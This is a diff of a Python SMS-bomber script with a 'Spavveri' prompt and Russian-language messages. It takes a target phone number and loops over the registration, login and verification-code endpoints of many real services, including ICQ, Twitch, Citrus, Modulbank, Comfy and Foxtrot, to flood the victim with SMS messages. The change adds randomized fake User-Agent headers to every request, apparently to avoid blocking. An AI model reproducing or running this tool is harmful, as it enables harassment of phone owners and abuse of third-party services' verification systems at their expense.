@@ -32,32 +32,32 @@ phone = console.input('[blue]Spavveri>>> ')
 run = int(console.input('[red]Введите количество повторов (1-10):\n[blue]Spavveri>>> '))
 #------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 for _ in track(range(run)):
- headers = {"User-Agent": fake_useragent.UserAgent().random}
+         headers = {"User-Agent": fake_useragent.UserAgent().random}
          try:
-             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
+             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=headers)
              print('[@'+str(bot_username)+'] [+] ICQ отправлено!')
          except:
              print('[@'+str(bot_username)+'] [-] Не отправлено!')
          try:
-             requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
+             requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username}, headers=headers)
              print('[@'+str(bot_username)+'] [+] Twitch отправлено!')
          except:
              print('[@'+str(bot_username)+'] [-] Не отправлено!')
          try:
-             requests.post("https://my.citrus.ua/api/v2/register", data={"email": email, "name": "Артем", "12phone": _phone, "password": password, "confirm_password": password})
+             requests.post("https://my.citrus.ua/api/v2/register", data={"email": email, "name": "Артем", "12phone": _phone, "password": password, "confirm_password": password}, headers=headers)
              print("[+] Регестрация на Citrus отправлена!")
          except:
              print('[@'+str(bot_username)+'] [-] не отправлено!')
 
          try:
-             requests.post("https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus})
+             requests.post("https://my.citrus.ua/api/auth/login", {"identity": _phoneCitrus}, headers=headers)
              print("[+] Citrus отправлено!")
          except:
              print("[-] не отправлено!")
 
          try:
              requests.post("https://my.modulbank.ru/api/v2/registration/nameAndPhone",
-             json={"FirstName": "Артем", "CellPhone": _phone, "Package": "optimal"})
+             json={"FirstName": "Артем", "CellPhone": _phone, "Package": "optimal"}, headers=headers)
              print('[@'+str(bot_username)+'] [+] отправлено!')
          except:
              print('[@'+str(bot_username)+'] [-] не отправлено!')
@@ -69,26 +69,26 @@ for _ in track(range(run)):
                  "phone": _phone,
                  "email": _email
              }
-         )
+         , headers=headers)
              print('[@'+str(bot_username)+'] [+] Moyo отправлено!')
          except:
              print('[@'+str(bot_username)+'] [-] не отправлено!')
 
          try:
-             requests.post('https://comfy.ua/ua/customer/account/createPost', data={"registration_name": "Артем", "registration_phone": _phoneComfy, "registration_email": _mail})
+             requests.post('https://comfy.ua/ua/customer/account/createPost', data={"registration_name": "Артем", "registration_phone": _phoneComfy, "registration_email": _mail}, headers=headers)
              print('[@'+str(bot_username)+'] [+] Comfy отправлено!')
          except:
               print('[@'+str(bot_username)+'] [-] не отправлено!')
 
          try:
-             requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ})
+             requests.post("https://www.foxtrot.com.ua/ru/account/sendcodeagain?Length=12", data={"Phone": _phoneQ}, headers=headers)
              print('[@'+str(bot_username)+'] [+] FoxTrot отправлено!')
              time.sleep(0.1)
          except:
              print('[@'+str(bot_username)+'] [-] не отправлено!')
 
          try:
-             requests.post('https://cinema5.ru/api/phone_code', data={"phone": _phonePizzahut})
+             requests.post('https://cinema5.ru/api/phone_code', data={"phone": _phonePizzahut}, headers=headers)
              print('[@'+str(bot_username)+'] [+] Cinema5 отправлено!')
              time.sleep(0.1)
          except:
@@ -102,7 +102,7 @@ for _ in track(range(run)):
                  "syf_prog": "clients-services",
                  "getSysParam": "yes",
              },
-         )
+         , headers=headers)
              print('[@'+str(bot_username)+'] [+] ETM отправлено!')
              time.sleep(0.1)
          except:
@@ -123,27 +123,27 @@ for _ in track(range(run)):
                  "formType": "simple",
                  "utc_offset": "120",
              },
-         )
+         , headers=headers)
              print('[@'+str(bot_username)+'] [+] Apteka отправлено!')
              time.sleep(0.1)
          except:
              print('[@'+str(bot_username)+'] [-] не отправлено!')
 
          try:
-             requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone})
+             requests.post("https://ube.pmsm.org.ru/esb/iqos-phone/validate", json={"phone": _phone}, headers=headers)
              print('[@'+str(bot_username)+'] [+] отправлено!')
          except:
              print('[@'+str(bot_username)+'] [-] не отправлено!')
 
          try:
-             requests.post("https://secunda.com.ua/personalarea/registrationvalidphone", data={"ph": "+" + _phone})
+             requests.post("https://secunda.com.ua/personalarea/registrationvalidphone", data={"ph": "+" + _phone}, headers=headers)
              print('[@'+str(bot_username)+'] [+] Secunda отправлено!')
              time.sleep(0.1)
          except:
              print('[@'+str(bot_username)+'] [-] не отправлено!')
 
          try:
-             requests.post("http://api.rozamira-azs.ru/v1/auth", data={"login": _phone,})
+             requests.post("http://api.rozamira-azs.ru/v1/auth", data={"login": _phone,}, headers=headers)
              print('[@'+str(bot_username)+'] [+] rozamira-azs отправлено!')
              time.sleep(0.1)
          except:
